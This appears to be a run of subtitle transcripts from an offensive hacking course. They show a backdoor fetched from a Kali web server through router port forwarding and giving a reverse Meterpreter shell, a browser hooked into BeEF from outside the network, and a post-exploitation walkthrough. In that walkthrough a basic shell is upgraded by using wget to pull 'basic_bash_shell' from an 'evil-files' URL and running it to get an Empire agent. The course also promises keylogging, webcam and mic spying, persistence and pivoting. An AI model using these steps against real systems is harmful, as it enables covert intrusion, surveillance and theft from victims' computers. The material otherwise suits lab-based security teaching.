And we called our backdoor, backdoor so I'm just gonna type in backdoor.exe and we're gonna hit Enter.

68

00:05:53,000  -->  00:05:59,840
It's actually 189 here not 89 and as you can see I was able to download the backdoor

69

00:05:59,840  -->  00:06:04,000
and this should actually tell you that IP forwarding has been set up correctly

70

00:06:04,000  -->  00:06:08,980
because without that, without IP forwarding I wouldn't be able to access my web server

71

00:06:08,980  -->  00:06:10,220
and download the backdoor.

72

00:06:10,220  -->  00:06:14,100
So I'm actually accessing the web server in Kali as if it's a normal website,

73

00:06:14,100  -->  00:06:17,020
like you can actually host fake web pages,

74

00:06:17,020  -->  00:06:20,700
you can host websites, anything you want right now on your Apache.

75

00:06:22,840  -->  00:06:25,500
So, I'm going to come in I'm going to run the back door...

76

00:06:28,640  -->  00:06:33,320
and we'll see if that'll give me a reverse connection on my Kali machine,

77

00:06:33,320  -->  00:06:35,960
which is on a completely different network.

78

00:06:38,260  -->  00:06:44,360
And as you can see, I got a reverse meterpreter shell and you can see that the shell is coming

79

00:06:44,360  -->  00:06:49,940
from an external IP address into my internal IP address to the Kali machine

80

00:06:50,340  -->  00:06:54,220
and right now I can control the target computer and do all the things

81

00:06:54,220  -->  00:06:56,600
that we do in the post connection attacks.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


1

00:00:02,560  -->  00:00:08,540
Okay. Now, let's have another example on hooking people to BeEF when they exist outside our network.

2

00:00:08,800  -->  00:00:12,220
So again, we're going to have the example I guess the same Windows machine,

3

00:00:12,220  -->  00:00:16,800
that's in a completely different network and we'll see how we can hook that machine into BeEF.

4

00:00:17,280  -->  00:00:19,320
So first of all, I'm gonna start BeEF.

5

00:00:20,420  -->  00:00:21,900
Just one click right here.

6

00:00:23,200  -->  00:00:24,980
And that'll start BeEF for me.

7

00:00:27,740  -->  00:00:31,100
And I'm gonna login, Username is 'beef' and Password is 'beef' as well.

8

00:00:33,000  -->  00:00:34,120
And we're logged in.

9

00:00:34,120  -->  00:00:38,440
Now, we're gonna use the same basic hook method that we did before.

10

00:00:39,000  -->  00:00:43,620
So in that method, we need to get the script, exact the script code right here, which is this.

11

00:00:44,420  -->  00:00:45,600
I'm going to copy that.

12

00:00:46,040  -->  00:00:49,040
And we did this before, so again I'm going to do it a little bit quickly.

13

00:00:49,520  -->  00:00:52,320
And we place that in our Apache web server.

14

00:00:52,320  -->  00:00:53,980
So, place it in an HTML page

15

00:00:54,560  -->  00:01:02,120
and that was in, always our Apache web, Home directory is 'var/www/html/html'.

16

00:01:06,520  -->  00:01:10,860
And I'm going to open my 'index' file, I'm
going to open it with the 'Text Editor'.

17

00:01:13,520  -->  00:01:16,880
And I'm gonna paste this code right here that I got from BeEF.

18

00:01:19,060  -->  00:01:22,440
And the only thing that you want to change, all of this is okay,

19

00:01:22,440  -->  00:01:27,180
the only thing that you want to change as I said before, anywhere that we used to use our normal IP,

20

00:01:27,540  -->  00:01:32,940
we're gonna use our external IP, so that people when they try to connect,

21

00:01:33,120  -->  00:01:39,480
they'll actually be able to find our computer because if we use the internal IP, they won't be able to see it.

22

00:01:40,060  -->  00:01:44,180
So again, I'm going to use the IP that we see on Google, when we type in, 'what's my IP'.

23

00:01:54,080  -->  00:01:56,220
And that's it, I'm good to go, so I'm gonna save this.

24

00:01:57,880  -->  00:01:58,740
Quit it.

25

00:01:59,280  -->  00:02:03,860
And now, I need to enable port 3000 which is the port that BeEF works on,

26

00:02:03,860  -->  00:02:07,140
as you can see we can see that, it uses port 3000 here.

27

00:02:07,780  -->  00:02:11,980
So, I need to tell the Router again in the 'IP forwarding' settings.

28

00:02:12,160  -->  00:02:17,360
I need to tell it to forward any requests that you get on port 3000,

29

00:02:18,600  -->  00:02:23,420
to my Kali machine, which is at '192.68.0.11'.

30

00:02:27,640  -->  00:02:28,780
I'm gonna save that.

31

00:02:31,620  -->  00:02:32,720
And that's it, that's saved.

32

00:02:33,040  -->  00:02:36,080
Now, we're gonna go to the Windows machine.

33

00:02:38,160  -->  00:02:40,880
We're gonna go to our website,

34

00:02:42,340  -->  00:02:45,180
which is my, basically, my IP, my external IP

35

00:02:45,340  -->  00:02:50,800
and we're gonna go, it's gonna run 'index.html' automatically because the file is called 'index',

36

00:02:50,980  -->  00:02:55,240
so all we have to do is just put the IP of the network that Kali is connected to.

37

00:02:55,760  -->  00:03:03,360
So, what we need to use is this IP address right here, which is '89.100.145.189'

38

00:03:03,960  -->  00:03:08,960
and we should be hooked to BeEF as soon as we browse to that IP.

39

00:03:09,300  -->  00:03:10,720
Do, let's see what happens.

40

00:03:18,560  -->  00:03:20,360
Okay. Now, let's go to BeEF.

41

00:03:23,240  -->  00:03:28,800
And as you can see, we got a Windows
machine hooked and it's used in Firefox 50

42

00:03:28,920  -->  00:03:33,280
and now, we can run all the commands
that BeEF allows us to run.

43

00:03:33,620  -->  00:03:36,300
So, let's  just throw an alert and see if it works.

44

00:03:41,120  -->  00:03:43,860
And it just says 'BeEF Alert Dialog', I'm just going to execute it,

45

00:03:43,860  -->  00:03:46,040
just to make sure that everything is working properly.

46

00:03:46,820  -->  00:03:53,360
And as you can see, we managed to hook a machine that exists in a completely different network

47

00:03:53,360  -->  00:03:55,580
and again to confirm that I'm going to go on Google.

48

00:03:57,040  -->  00:03:58,720
And I'm gonna look for 'what's my ip'.

49

00:04:01,700  -->  00:04:06,320
And as you can see, the IP is completely
different to the IP that's in this machine.

50

00:04:07,380  -->  00:04:14,000
So, again all we have to do is use the external IP address whenever you're sending it outside the network,

51

00:04:14,340  -->  00:04:16,860
use the IP that you see when you type in 'whats my IP address'.

52

00:04:17,720  -->  00:04:20,340
When you're listening on your own machine, use the local IP

53

00:04:20,580  -->  00:04:24,280
and make sure you configure the router to redirect the ports

54

00:04:24,280  -->  00:04:30,520
that you're listening on to the Kali machine, to the IP address, to the private IP address of the Kali machine.

55

00:04:32,560  -->  00:04:38,200
An alternative to using 'IP forwarding', you can set the Kalimachine as a DMZ HOST.

56

00:04:38,460  -->  00:04:42,540
Now, not all routers support DMZ that's why I didn't show it from the start

57

00:04:43,140  -->  00:04:45,200
but if it supports it, you can use it.

58

00:04:45,440  -->  00:04:47,100
And what DMZ does is,

59

00:04:47,360  -->  00:04:51,400
it's basically, 'IP forwarding' but it forwards all ports.

60

00:04:53,060  -->  00:04:56,800
So, if you put the IP address here of the Kali machine in here,

61

00:04:57,400  -->  00:05:02,180
what the router is gonna do, any time it gets a request for any port, any port at all,

62

00:05:02,440  -->  00:05:06,960
it will forward that request to the Kali machine regardless of what part it is.

63

00:05:07,540  -->  00:05:11,620
So with port forwarding, you actually select which parts you want to forward to Kali,

64

00:05:11,620  -->  00:05:15,920
with DMZ, it will forward all the ports to the IP that you put in here.

65

00:05:19,300  -->  00:05:26,740
Now, again both of these methods can be used to allow devices on different networks to access your computer,

66

00:05:26,740  -->  00:05:28,200
so you can receive connections,

67

00:05:28,580  -->  00:05:30,620
you can allow them to access a website.

68

00:05:30,860  -->  00:05:35,020
If you're hosting a website on your web server, you can allow them to access fake websites,

69

00:05:35,020  -->  00:05:36,740
you can allow them to access BeEF,

70

00:05:37,020  -->  00:05:37,540
the hook,

71

00:05:37,880  -->  00:05:40,220
anything, anything where you're listening on a port,

72

00:05:40,480  -->  00:05:43,240
you can use this method to allow people to access it,

73

00:05:43,240  -->  00:05:49,480
if the people exist on completely different network than your own network.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 16: Post Exploitation

1

00:00:00,700  -->  00:00:03,674
So far, in the course, we covered a lot of methods

2

00:00:03,674  -->  00:00:07,480
to gain access to a lot of different types of operating systems.

3

00:00:08,100  -->  00:00:13,320
In all of these methods, we stopped the lecture as soon as we gained our access to the system.

4

00:00:13,780  -->  00:00:18,060
So, I'd execute a simple command like a 'sys info' or 'list directories',

5

00:00:18,140  -->  00:00:21,860
just to prove to you that I have access to that computer now that I hacked it

6

00:00:22,100  -->  00:00:25,400
and then I'd stop the lecture and move to the next topic.

7

00:00:26,060  -->  00:00:30,540
We did this because I wanted to continue with the gaining access methods before

8

00:00:31,120  -->  00:00:33,800
but now we're in the 'Post Exploitation' section.

9

00:00:34,300  -->  00:00:39,840
So in this section, I'm going to teach you how to use the access that we gained in the previous lectures.

10

00:00:41,000  -->  00:00:46,280
So in all of the lectures in the section, we're actually going to start from a hacked computer,

11

00:00:46,280  -->  00:00:49,180
we're going to assume that we've already hacked into our target.

12

00:00:50,000  -->  00:00:54,660
We're going to start with the simplest access that we got which is the simple 'reverse shell access'

13

00:00:54,660  -->  00:00:57,560
that we got from the one line command that I showed you.

14

00:00:57,800  -->  00:01:02,420
From there, we'll see how we can upgrade that to a more advanced backdoor,

15

00:01:02,420  -->  00:01:05,880
like 'Meterpreter backdoor' or an 'Empire backdoor'.

16

00:01:06,300  -->  00:01:12,380
And we'll see how we can use these backdoors and use their modules to control the whole operating system.

17

00:01:13,840  -->  00:01:15,920
We'll be able to access the file system.

18

00:01:15,960  -->  00:01:18,960
We'll be able to read, edit, upload, download files.

19

00:01:19,360  -->  00:01:24,380
We'll be able to access the computer components such as the camera, the mic, the keyboard.

20

00:01:24,700  -->  00:01:28,800
You'll be able to record all keystrokes and spy on the target.

21

00:01:29,400  -->  00:01:33,100
You'll also see how we can maintain our access on that computer,

22

00:01:33,100  -->  00:01:37,200
so even if the target restarts their computer, we'll still be able to access it.

23

00:01:38,340  -->  00:01:41,240
You'll see how to escalate your privileges on the target computer

24

00:01:41,520  -->  00:01:47,080
and change your current session from a user to an admin and then you'll be able to do literally anything

25

00:01:47,080  -->  00:01:48,620
that you want on the computer.

26

00:01:49,080  -->  00:01:54,420
You'll even learn how to use the target computer to hack into other computers.

27

00:01:55,060  -->  00:01:58,200
And that's not only it, we're going to be covering so many modules

28

00:01:58,420  -->  00:02:02,000
and you'll see that you'll have full control over the computer that you hacked.

29

00:02:03,220  -->  00:02:07,920
So again, all of the next lectures, we're going to assume that you've already hacked into your target

30

00:02:08,160  -->  00:02:10,640
and you already have a session on it.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:00,980  -->  00:00:06,320
Now, throughout the course we've seen how to gain access to different types of operating systems

2

00:00:06,560  -->  00:00:08,680
and using different types of backdoors.

3

00:00:09,200  -->  00:00:14,900
The simplest method was using the one line Bash command that gave us a reverse shell

4

00:00:14,920  -->  00:00:18,720
and I said that command works on Linux, OS X and Android and iOS.

5

00:00:19,080  -->  00:00:22,320
So basically, on all Linux based computers.

6

00:00:22,740  -->  00:00:25,860
What I wanna show you today is some basic commands,

7

00:00:26,180  -->  00:00:31,400
how to use that access and how to convert that access to more advanced backdoor?

8

00:00:31,760  -->  00:00:35,380
Because this is really cool, with this we can run all the Linux commands

9

00:00:35,380  -->  00:00:37,420
and we've seen linux commands before.

10

00:00:37,660  -->  00:00:39,260
They allow us to do anything that we want

11

00:00:39,820  -->  00:00:45,580
but the other backdoors, like the Meterpreter backdoor and Empire backdoors

12

00:00:45,720  -->  00:00:48,220
allow us to do much more on the target systems.

13

00:00:48,780  -->  00:00:54,340
So I wanna show you how to do that, how to convert this access to a more or a better access.

14

00:00:55,700  -->  00:00:58,280
Now, usually, the first thing that you want to do

15

00:00:58,440  -->  00:01:02,580
once you're on a system, you would wanna get information about that system.

16

00:01:02,740  -->  00:01:06,320
So, the command to do that is going to be 'uname -a'

17

00:01:09,240  -->  00:01:12,460
and that's gonna tell us the operating system of the target

18

00:01:12,780  -->  00:01:14,600
and we can see here it's running Linux.

19

00:01:15,200  -->  00:01:20,100
We can see the computer name in here, which is Zaid-VirtualBox.

20

00:01:21,380  -->  00:01:24,940
You can see the version of the Linux kernel that's running on that system.

21

00:01:25,280  -->  00:01:30,480
And in here, it's '4. 8. 0', we can also see the exact Linux distro.

22

00:01:30,720  -->  00:01:35,420
So, we can see that this target is running Ubuntu 16.04.

23

00:01:36,460  -->  00:01:41,900
And at the end, we can also see that this is a 64-bit version of Linux

24

00:01:42,280  -->  00:01:45,900
and that means that the target is using 64-bit processor.

25

00:01:46,900  -->  00:01:49,580
Now, this information is very important for the future.

26

00:01:49,580  -->  00:01:55,460
If you want to use local exploits to escalate your privileges and change your access to root access.

27

00:01:56,740  -->  00:02:01,200
Now, if you wanna check the current user and your access, you can just do 'whoami'

28

00:02:03,180  -->  00:02:06,580
and this will tell me that I am Zaid at the moment.

29

00:02:06,900  -->  00:02:10,440
So, I'm logged in or I have privileges for a user called Zaid.

30

00:02:10,900  -->  00:02:14,080
If I was root, I'll see you root and here instead of Zaid.

31

00:02:14,840  -->  00:02:20,329
Root is the admin user, like I said before and this is the user with the highest privileges.

32

00:02:20,329  -->  00:02:24,200
So if your're root, you'd be able to do anything that you wanted the server.

33

00:02:24,800  -->  00:02:27,420
This is very important when you're hacking into web servers

34

00:02:27,540  -->  00:02:29,900
and bigger servers, the normal computers

35

00:02:30,140  -->  00:02:36,000
because if you're root, you'll literally hack into all of the websites that's hosted on that server.

36

00:02:36,080  -->  00:02:40,180
So sometimes servers have thousands of websites and if you become root

37

00:02:40,180  -->  00:02:42,440
then you'll have access to all of these websites.

38

00:02:44,180  -->  00:02:50,200
The third command that's very useful for gathering information about your target is 'ifconfig'

39

00:02:52,700  -->  00:02:57,840
and we've actually seen this before when we were using Linux, when we were using Kali

40

00:02:57,840  -->  00:03:00,200
to get information about our interfaces.

41

00:03:01,340  -->  00:03:04,780
Again, if this was a server and a complicated network,

42

00:03:05,100  -->  00:03:07,820
you'll see all the interfaces that it's connected to

43

00:03:08,220  -->  00:03:12,040
and you'll see the IP addresses of these interfaces.

44

00:03:12,740  -->  00:03:18,160
Again, this would be very handy if you are trying to hack into the network that this device is connected to.

45

00:03:18,520  -->  00:03:21,180
So you'll know that the network, it's connected to from here.

46

00:03:21,200  -->  00:03:24,620
We can see it's connected to a network called 10.20.14 .221.

47

00:03:25,300  -->  00:03:29,319
Suppose that you can't actually have access to this network from outside the internet

48

00:03:29,680  -->  00:03:35,640
then you can use this computer as a pivot and from here hacking to other computers in that network.

49

00:03:37,580  -->  00:03:42,640
Now, you can actually run all the Linux commands that we've seen in the preparation section

50

00:03:42,640  -->  00:03:44,660
when I was giving you the Linux basics.

51

00:03:45,100  -->  00:03:47,760
So, you can do 'pwd' to see where you are.

52

00:03:48,260  -->  00:03:51,000
You can do 'ls' to list the files.

53

00:03:51,620  -->  00:03:54,900
You can cd, so if we want to go to the downloads for example,

54

00:03:55,080  -->  00:03:56,920
we can see we have a directory called downloads.

55

00:03:57,340  -->  00:04:01,820
If we wanna go into it, we can just do cd Downloads

56

00:04:03,620  -->  00:04:08,540
and then do 'ls' to list and we have the stuff in the downloads.

57

00:04:08,980  -->  00:04:11,540
You can do 'rm' to remove files.

58

00:04:11,540  -->  00:04:17,216
You can do 'cp' to copy and all the Linux commands that we've seen before and discussed.

59

00:04:17,800  -->  00:04:21,940
I've also attached a list of other Linux commands that you can do

60

00:04:21,940  -->  00:04:26,620
in the resources of the Linux basics lecture in the first section of this course.

61

00:04:27,620  -->  00:04:31,440
That's why I'm not going to cover all the Linux commands because we've seen them before

62

00:04:31,600  -->  00:04:36,220
and you can execute them exactly the same way that you'd execute it on a normal computer.

63

00:04:37,680  -->  00:04:43,440
What I wanna show you now is how to convert this very basic access to an Empire access.

64

00:04:43,440  -->  00:04:47,720
So I want to be able to use the modules that Empire allows me to use.

65

00:04:48,400  -->  00:04:52,940
Now, you can use this method to convert your access to a Meterpreter shell as well

66

00:04:52,980  -->  00:04:55,640
but I'm just gonna give an example on Empire.

67

00:04:56,440  -->  00:05:00,620
So what I'm gonna do is, I'm just gonna 'clear' to clear everything from screen.

68

00:05:01,000  -->  00:05:05,900
So we have a nice clear screen and then we're actually gonna use commands that we've seen before

69

00:05:06,280  -->  00:05:08,220
and they're gonna be very similar to the commands

70

00:05:08,300  -->  00:05:11,640
that we used in the download and execute payload in OSX.

71

00:05:12,460  -->  00:05:16,720
There are actually the same commands that we used in the download and a report payload as well

72

00:05:17,060  -->  00:05:21,060
but I'm just gonna give you an example here, so the idea is clearer.

73

00:05:22,100  -->  00:05:26,000
So the first thing that I'm gonna do is I'm going to go to the temp directory

74

00:05:26,380  -->  00:05:29,780
and we're gonna do that using cd / temp.

75

00:05:32,060  -->  00:05:35,240
Now, if we did 'pwd', you'll see we are in
temp.

76

00:05:35,760  -->  00:05:40,940
Now, the next thing that we wanna do is we want to download the Empire backdoor.

77

00:05:41,440  -->  00:05:47,140
So like we seen before, if this, if the target is OS X, you can use the cURL command

78

00:05:47,700  -->  00:05:51,400
or if your target is Linux then, you can just do 'wget'.

79

00:05:52,020  -->  00:05:55,880
Now, you can actually try both and it will complain if it doesn't have that command.

80

00:05:56,100  -->  00:05:57,660
For example, if I do cURL now,

81

00:05:58,220  -->  00:06:02,680
you'll see that it's gonna tell me cURL is not installed, you need to install it using apt-get.

82

00:06:02,920  -->  00:06:05,420
So I'm gonna be like, okay, I'll just try 'wget'.

83

00:06:05,420  -->  00:06:08,540
So you actually have two methods that you can use now, under your Arsenal.

84

00:06:09,200  -->  00:06:15,500
So, I'm gonna use 'wget' and then I'm gonna put the location where my Empire backdoor is stored

85

00:06:15,500  -->  00:06:17,220
and it can be downloaded from.

86

00:06:17,480  -->  00:06:21,800
Again, this has to be a direct download link and we spoke about what we mean by that.

87

00:06:22,020  -->  00:06:28,200
So it's just a link that can directly allow us to download the file without ads, without HTML pages.

88

00:06:28,600  -->  00:06:37,140
So mine is stored in 'http://10.20.14.213/evil-files' and it's called 'basic_bash_shell'.

89

00:06:38,800  -->  00:06:43,260
Now, we've already spoke about how to create this and we downloaded it and tested it before.

90

00:06:43,560  -->  00:06:46,320
So if you don't remember what this file is or how it works,

91

00:06:46,720  -->  00:06:51,420
please go back to the Linux evil file section and revise how we created this file.

92

00:06:51,540  -->  00:06:52,900
So, I'm gonna hit Enter.

93

00:06:55,440  -->  00:06:56,600
Now, the file is downloaded.

94

00:06:56,700  -->  00:07:03,300
If we do 'ls', you'll see that we have the file and here it's called basic_bash_shell.

95

00:07:04,540  -->  00:07:11,400
Now, before we execute this file, I'm gonna start my Empire, so that I can receive the connection.

96

00:07:11,560  -->  00:07:20,140
So I'm just going to split the screen and go to Empire and run Empire.

97

00:07:22,400  -->  00:07:25,100
Now, we covered all of this that's why I'm doing it very quickly.

98

00:07:25,280  -->  00:07:27,400
It should be very easy for you by now.

99

00:07:28,440  -->  00:07:32,100
And now that Empire is working and we don't have any agents as you can see here.

100

00:07:32,540  -->  00:07:35,800
I'm just gonna go up in here and run this file.

101

00:07:36,220  -->  00:07:39,930
And I'm gonna run it just like we ran we ran it before, all I have to do is just do bash.

102

00:07:42,160  -->  00:07:43,620
Okay! I misspelled that,

103

00:07:43,620  -->  00:07:49,740
so we're just going to do 'bash' followed by the file name, which is basic_bash_shell.

104

00:07:51,360  -->  00:07:52,140
Hit Enter.

105

00:07:55,140  -->  00:07:59,120
And as you can see we got our agent connecting back to us from here.

106

00:07:59,460  -->  00:08:05,800
Now, if we just go to agents, you can see we have the agent there and we can interact with it.

107

00:08:08,440  -->  00:08:15,120
And we'll just run our favorite command, 'sysinfo', just to confirm that we got access to that computer

108

00:08:16,200  -->  00:08:19,460
and as you can see, now we're inside the target Linux machine,

109

00:08:19,840  -->  00:08:24,320
where we can use all the modules that Empire allow us to use.

110

00:08:25,500  -->  00:08:29,720
So, like you've seen, we actually managed to do this using very basic Linux commands.

111

00:08:29,880  -->  00:08:31,400
We use the 'cd' command to navigate.

112

00:08:31,640  -->  00:08:35,280
We use the 'wget' to download and then we executed the file.

113

00:08:35,800  -->  00:08:37,700
So you can do this with OS X as well.

114

00:08:37,700  -->  00:08:41,160
If you got your access on RSX using a basic shell,

115

00:08:41,440  -->  00:08:47,160
all you have to do is just download the backdoor for OS X using the curl command,

116

00:08:47,160  -->  00:08:53,320
like we seen in the download and execute payload lecture, instead of the 'wget' command.

117

00:08:54,280  -->  00:08:58,140
And also you can use this method to download and execute anything that you want.

118

00:08:58,360  -->  00:09:00,480
So it doesn't have to be an Empire payload,

119

00:09:00,760  -->  00:09:05,420
you can do it to download and execute a Keylogger or a Meterpreter backdoor if you want.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
